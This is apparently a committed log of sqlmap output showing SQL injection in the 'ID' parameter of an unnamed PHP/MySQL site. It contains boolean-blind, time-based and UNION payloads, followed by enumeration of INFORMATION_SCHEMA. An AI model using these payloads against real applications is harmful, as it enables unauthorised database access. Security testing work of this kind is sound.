@@ -1,0 +1,192 @@
+sqlmap identified the following injection point(s) with a total of 121 HTTP(s) requests:
+---
+Parameter: ID (GET)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: ID=2096 AND 2057=2057
+    Vector: AND [INFERENCE]
+
+    Type: AND/OR time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind
+    Payload: ID=2096 AND SLEEP(5)
+    Vector: AND [RANDNUM]=IF(([INFERENCE]),SLEEP([SLEEPTIME]),[RANDNUM])
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 12 columns
+    Payload: ID=-4239 UNION ALL SELECT 44,44,44,44,CONCAT(0x716a786a71,0x54786b42794d7a596b64717458505a4b4746767757736e71746b5a504b4b61584874426e4d77666b,0x7176786b71),44,44,44,44,44,44,44-- OifY
+    Vector:  UNION ALL SELECT 44,44,44,44,[QUERY],44,44,44,44,44,44,44[GENERIC_SQL_COMMENT]
+---
+web server operating system: FreeBSD
+web application technology: PHP 5.4.23, Apache 2.2.26
+back-end DBMS: MySQL >= 5.0.12
+available databases [1]:
+[*] INFORMATION_SCHEMA
+
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: ID (GET)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: ID=2096 AND 2057=2057
+    Vector: AND [INFERENCE]
+
+    Type: AND/OR time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind
+    Payload: ID=2096 AND SLEEP(5)
+    Vector: AND [RANDNUM]=IF(([INFERENCE]),SLEEP([SLEEPTIME]),[RANDNUM])
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 12 columns
+    Payload: ID=-4239 UNION ALL SELECT 44,44,44,44,CONCAT(0x716a786a71,0x54786b42794d7a596b64717458505a4b4746767757736e71746b5a504b4b61584874426e4d77666b,0x7176786b71),44,44,44,44,44,44,44-- OifY
+    Vector:  UNION ALL SELECT 44,44,44,44,[QUERY],44,44,44,44,44,44,44[GENERIC_SQL_COMMENT]
+---
+web server operating system: FreeBSD
+web application technology: PHP 5.4.23, Apache 2.2.26
+back-end DBMS: MySQL >= 5.0.12
+available databases [1]:
+[*] INFORMATION_SCHEMA
+
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: ID (GET)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: ID=2096 AND 2057=2057
+    Vector: AND [INFERENCE]
+
+    Type: AND/OR time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind
+    Payload: ID=2096 AND SLEEP(5)
+    Vector: AND [RANDNUM]=IF(([INFERENCE]),SLEEP([SLEEPTIME]),[RANDNUM])
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 12 columns
+    Payload: ID=-4239 UNION ALL SELECT 44,44,44,44,CONCAT(0x716a786a71,0x54786b42794d7a596b64717458505a4b4746767757736e71746b5a504b4b61584874426e4d77666b,0x7176786b71),44,44,44,44,44,44,44-- OifY
+    Vector:  UNION ALL SELECT 44,44,44,44,[QUERY],44,44,44,44,44,44,44[GENERIC_SQL_COMMENT]
+---
+web server operating system: FreeBSD
+web application technology: PHP 5.4.23, Apache 2.2.26
+back-end DBMS: MySQL >= 5.0.12
+Database: INFORMATION_SCHEMA
+[1 table]
++----------------+
+| CHARACTER_SETS |
++----------------+
+
+Database: INFORMATION_SCHEMA
++----------------+---------+
+| Table          | Entries |
++----------------+---------+
+| CHARACTER_SETS | 39      |
++----------------+---------+
+
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: ID (GET)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: ID=2096 AND 2057=2057
+    Vector: AND [INFERENCE]
+
+    Type: AND/OR time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind
+    Payload: ID=2096 AND SLEEP(5)
+    Vector: AND [RANDNUM]=IF(([INFERENCE]),SLEEP([SLEEPTIME]),[RANDNUM])
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 12 columns
+    Payload: ID=-4239 UNION ALL SELECT 44,44,44,44,CONCAT(0x716a786a71,0x54786b42794d7a596b64717458505a4b4746767757736e71746b5a504b4b61584874426e4d77666b,0x7176786b71),44,44,44,44,44,44,44-- OifY
+    Vector:  UNION ALL SELECT 44,44,44,44,[QUERY],44,44,44,44,44,44,44[GENERIC_SQL_COMMENT]
+---
+web server operating system: FreeBSD
+web application technology: PHP 5.4.23, Apache 2.2.26
+back-end DBMS: MySQL >= 5.0.12
+Database: INFORMATION_SCHEMA
+[1 table]
++----------------+
+| CHARACTER_SETS |
++----------------+
+
+Database: INFORMATION_SCHEMA
+Table: CHARACTER_SETS
+[1 column]
++--------+------+
+| Column | Type |
++--------+------+
+| C      | H    |
++--------+------+
+
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: ID (GET)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: ID=2096 AND 2057=2057
+    Vector: AND [INFERENCE]
+
+    Type: AND/OR time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind
+    Payload: ID=2096 AND SLEEP(5)
+    Vector: AND [RANDNUM]=IF(([INFERENCE]),SLEEP([SLEEPTIME]),[RANDNUM])
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 12 columns
+    Payload: ID=-4239 UNION ALL SELECT 44,44,44,44,CONCAT(0x716a786a71,0x54786b42794d7a596b64717458505a4b4746767757736e71746b5a504b4b61584874426e4d77666b,0x7176786b71),44,44,44,44,44,44,44-- OifY
+    Vector:  UNION ALL SELECT 44,44,44,44,[QUERY],44,44,44,44,44,44,44[GENERIC_SQL_COMMENT]
+---
+web server operating system: FreeBSD
+web application technology: PHP 5.4.23, Apache 2.2.26
+back-end DBMS: MySQL >= 5.0.12
+Database: INFORMATION_SCHEMA
+[1 table]
++----------------+
+| CHARACTER_SETS |
++----------------+
+
+Database: INFORMATION_SCHEMA
+Table: CHARACTER_SETS
+[39 entries]
++------+
+| C    |
++------+
+| NULL |
+| NULL |
+| NULL |
+| NULL |
+| NULL |
+| NULL |
+| NULL |
+| NULL |
+| NULL |
+| NULL |
+| NULL |
+| NULL |
+| NULL |
+| NULL |
+| NULL |
+| NULL |
+| NULL |
+| NULL |
+| NULL |
+| NULL |
+| NULL |
+| NULL |
+| NULL |
+| NULL |
+| NULL |
+| NULL |
+| NULL |
+| NULL |
+| NULL |
+| NULL |
+| NULL |
+| NULL |
+| NULL |
+| NULL |
+| NULL |
+| NULL |
+| NULL |
+| NULL |
+| NULL |
++------+
+
